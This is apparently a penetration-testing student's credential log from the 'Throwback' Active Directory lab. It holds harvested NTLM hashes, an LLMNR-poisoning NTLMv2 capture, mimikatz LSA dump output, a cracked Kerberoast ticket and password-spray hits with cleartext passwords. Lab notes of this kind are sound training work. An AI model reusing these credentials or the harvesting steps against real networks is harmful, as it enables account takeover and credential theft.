# Credentials

Much like "This jug of milk contains milk", this file contains credentials. This is just a place to store credientals as I go through. I have added toggles just in case you also did not mean to click on this.


## Address book contacts

From thbguest account:

```{toggle}
HumphreyW	W Humphrey	HumphreyW@throwback.local	
SummersW	Summers Winters	SummersW@throwback.local	
FoxxR	Rikka Foxx	FoxxR@throwback.local	
noreply	noreply noreply	noreply@throwback.local	
DaibaN	Nana Daiba	DaibaN@throwback.local	
PeanutbutterM	Mr Peanutbutter	PeanutbutterM@throwback.local	
PetersJ	Jon Peters	PetersJ@throwback.local	
DaviesJ	J Davies	DaviesJ@throwback.local	
BlaireJ	J Blaire	BlaireJ@throwback.local	
GongoH	Hugh Gongo	GongoH@throwback.local	
MurphyF	Frank Murphy	MurphyF@throwback.local	
JeffersD	D Jeffers	JeffersD@throwback.local	
HorsemanB	BoJack Horseman	HorsemanB@throwback.local
```
## usernames.txt
```bash
HumphreyW
SummersW
FoxxR
DaibaN
PeanutbutterM
PetersJ
DaviesJ
BlaireJ
GongoH
MurphyF
JeffersD
HorsemanB
```

## Emails
```bash
HumphreyW@throwback.local
SummersW@throwback.local
FoxxR@throwback.local
noreply@throwback.local
DaibaN@throwback.local
PeanutbutterM@throwback.local
PetersJ@throwback.local
DaviesJ@throwback.local
BlaireJ@throwback.local
GongoH@throwback.local
MurphyF@throwback.local
JeffersD@throwback.local
HorsemanB@throwback.local

# listed

HumphreyW@throwback.local,SummersW@throwback.local,FoxxR@throwback.local,noreply@throwback.local,DaibaN@throwback.local,PeanutbutterM@throwback.local,PetersJ@throwback.local,DaviesJ@throwback.local,BlaireJ@throwback.local,GongoH@throwback.local,MurphyF@throwback.local,JeffersD@throwback.local,HorsemanB@throwback.local

```

## Hashes
WS-01
```{toggle}
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BlaireJ:1001:aad3b435b51404eeaad3b435b51404ee:c374ecb7c2ccac1df3a82bce4f80bb5b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1002:aad3b435b51404eeaad3b435b51404ee:50527b4bfe81a64edf00e6b05c26c195:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0a06b1381599f2c8c8bfdbee39edbe1c:::
```

LLMNR Posoning Attack
```{toggle}
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.102.219
[SMB] NTLMv2-SSP Username : THROWBACK\PetersJ
[SMB] NTLMv2-SSP Hash     : PetersJ::THROWBACK:1ba2a3f4b083c8d4:C5B479C8FC3740B2F706008A0E339737:010100000000000000517F64A74ED801D162285A3EF06E3E00000000020008004A0044004200420001001E00570049004E002D00430036004B0055004C00590031004E0052004900590004003400570049004E002D00430036004B0055004C00590031004E005200490059002E004A004400420042002E004C004F00430041004C00030014004A004400420042002E004C004F00430041004C00050014004A004400420042002E004C004F00430041004C000700080000517F64A74ED80106000400020000000800300030000000000000000000000000200000A5DA1F8E7C6D9C6562C9A702AB83B3B83FA6E583B161BE02660F9A33C82518C60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00390036002E00330034000000000000000000

```

Mimikatz Prod
```mimikatz
mimikatz # lsadump::lsa /patch
Domain : THROWBACK-PROD / S-1-5-21-1142397155-17714838-1651365392

RID  : 000003f2 (1010)
User : admin-petersj
LM   :
NTLM : 74fb0a2ee8a066b1e372475dcbc121c5

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : a06e58d15a2585235d18598788b8147a

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003f1 (1009)
User : sshd
LM   :
NTLM : fe2acb5ea93988befc849a6981e0526a

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 58f8e0214224aebc2c5f82fb7cb47ca1

```

SQLservice Kerboast

```{toggle}
$krb5tgs$23$*SQLService$THROWBACK.LOCAL$TB-ADMIN-DC/SQLService.THROWBACK.local~6792*$a68ba80e9ff585d5e8d0f69f4628445e$4b25e673215c52659fe7fb05146904dde495f23da1c26b91746407045bf95ad7754f4901378f93f1bd172d8c4173ad732dfd4e96ec3d9ce7d03e13e6a37e6836aa55736face00fbe1af3e5d50d38b663e3ef1efc788538442dcbcdc6b8587484ffb26fe67ba5d0f66964873b62e8fa4b81ef3016e0dcdef62367467f3163353807d740c3fb73e61f787c5f0618b78bbd8f1fc726d0ce8d33551e0ed1c7b2641e7b3b8b4a22744cc093c7f17642de631459bb3e6cd77702bb5b6d7361510484465a1579cdc2d2560eec03648d6077b342895473064332cc4afd52f69e4ec80278c26c3920a119e505f7faba5df26383fda6ca3713a9ccd7ad8f694190350b3d8a107f4c2f0bc5b94dadd036011b2f9401db58886929473887b6b9cab53944704a3d1b04d3031fdf3cfcf09bdd6cb911d8f198d74cff921051d4629c7797a02f5fcfe8668059d85c36cf58f6f61e1dc673313162970ed2050338cb9abc4496e6a73f7c439cc01abb214d64f8d25678db1d40502fb6c4cef2ac514784d2fd00c66cfd3982d04472d4a853cd9b306a8254407497b1c8e35c7daac73513651ca79ae99f583fe35bb92d2333ed5f1aa3884ac2bb50a36edda20731d21051a8564bb84a86698e2c4f7454dc437a69d025f23e81a65b8c12d0b027bd00dcacc11dbc3199929f74aaf606cf0f25c742afb972710d5e59c824e82521e470723b6df882fd6d50677b6a8f377ee524da018dcc2585a752f8c6cf839187d6a26570a376aee17c7e08898938aa119c7fc51503a11f2779f4f9e20095c1de1244f957359b547c342658d9a07bc198b32a91403fbb60bdb7b435785355790616d9c5d5e02d86c1829df863686b18ba826800cf599898462351a4199e89affedbe5717074eca080d1772b2b9ff0a92a8a69ca3346468ad0bb271e48727e6931086188f3079172639ae83ab59e119948d29f0b078d617fb78d0853e52cb8f57e917d3280699c2d8a17cf4191f7b4820eebf4ce7664b3faa79e6ac97fb7bb35d62c76800928567cf94aeed5e304d48428e1ae73620f280d32b325b98b66285cbe541212a1532ea9bf96bd8f575bd194a659e0aff299c9356cd49e3a813abf1952d89f7e7401546dcc0ee62d1ac28bb3857d98fee7210a9a19d4bfd9ca91b08c317f8e9bcd3be53f59f927bef0364ba5bc28dd99bbf0a7deb7d064777f40d98c9b52e906e66b1b665d0ec3cf78912c69c93ba82d4d57336e184739d9f687d646802e5bfb3bb50ebfd2e4c3c7a5d0160c3bbb0d7872bc7378fb8310573434f797ef1ea79ca4910ec441e44dc58866d3f0340fc9761158d873e5762595fc439ea0f44935e1438a56ba2138fcf797156eba1869f4966397bb7687021af52e731005e26114c00eefcc9a397160048caf735846da7c22c473be4b526859:mysql337570
```

#### HumphreyW
```{toggle}
pFsense:HumphreyW:1c13639dba96c7b53d26f7d00956a364
securitycenter

```
#### SummersW
```{toggle}


```

#### FoxxR
```{toggle}


```
#### DaibaN
```{toggle}


```
#### PeanutbutterM
```{toggle}
[80][http-post-form] host: 10.200.102.232   login: PeanutbutterM   password: Summer2020

```
#### PetersJ
```{toggle}
PROD Throwback317

```
#### DaviesJ
```{toggle}
[80][http-post-form] host: 10.200.102.232   login: DaviesJ   password: Management2018

```
#### BlaireJ
```{toggle}
7eQgx6YzxgG3vC45t5k9
c374ecb7c2ccac1df3a82bce4f80bb5b
```
#### GongoH 
Email account requires full name

```{toggle}
[80][http-post-form] host: 10.200.102.232   login: GongoH   password: Summer2020

```
#### MurphyF
No contacts in address book

```{toggle}

[80][http-post-form] host: 10.200.102.232   login: MurphyF   password: Summer2020

```
#### JeffersD
Email account requires full name
Has ssh on Prod!

```{toggle}
[80][http-post-form] host: 10.200.102.232   login: JeffersD   password: Summer2020

```
#### HorsemanB
```{toggle}


```

#### admin-petersj
```toggle
PROD SinonFTW123
```